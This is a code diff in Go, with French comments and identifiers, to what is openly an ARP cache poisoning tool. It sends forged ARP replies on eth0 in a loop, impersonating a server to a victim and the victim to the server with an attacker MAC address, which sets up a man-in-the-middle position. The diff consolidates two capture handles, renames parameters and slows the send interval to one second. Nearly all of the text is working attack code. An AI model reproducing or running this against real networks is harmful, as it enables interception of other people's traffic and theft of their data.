@@ -12,9 +12,7 @@ import (
 
 func launchPoisoning(global *global, ctx context.Context) {
 	handle := createPoisoningHandle("eth0")
-	handle2 := createPoisoningHandle("eth0")
 	defer handle.Close()
-	defer handle2.Close()
 	count := 0
 	for {
 		select {
@@ -22,10 +20,10 @@ func launchPoisoning(global *global, ctx context.Context) {
 			return
 		default:
 			poisoningARP(handle, global.victime_ip, global.attaquant_mac, global.serveur_ip, global.serveur_mac)
-			// probleme ici sur un des cote
-			poisoningARP(handle2, global.serveur_ip, global.attaquant_mac, global.victime_ip, global.victime_mac)
+			// probleme ici sur un des cote quand je ping parfois jai de la perte
+			poisoningARP(handle, global.serveur_ip, global.attaquant_mac, global.victime_ip, global.victime_mac)
 			printPoisoning(&count)
-			time.Sleep(50 * time.Millisecond)
+			time.Sleep(1 * time.Second)
 		}
 	}
 }
@@ -38,10 +36,10 @@ func createPoisoningHandle(nameOfdevice string) *pcap.Handle {
 	return handle
 }
 
-func poisoningARP(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {
+func poisoningARP(handle *pcap.Handle, ip_to_usurpate net.IP, attaquant_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {
 
 	eth := layers.Ethernet{
-		SrcMAC:       my_mac,
+		SrcMAC:       attaquant_mac,
 		DstMAC:       mac_target,
 		EthernetType: layers.EthernetTypeARP,
 	}
@@ -51,7 +49,7 @@ func poisoningARP(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.Hardwar
 		HwAddressSize:     6,
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
-		SourceHwAddress:   []byte(my_mac),
+		SourceHwAddress:   []byte(attaquant_mac),
 		SourceProtAddress: []byte(ip_to_usurpate.To4()),
 		DstHwAddress:      []byte(mac_target),
 		DstProtAddress:    []byte(ip_target.To4()),
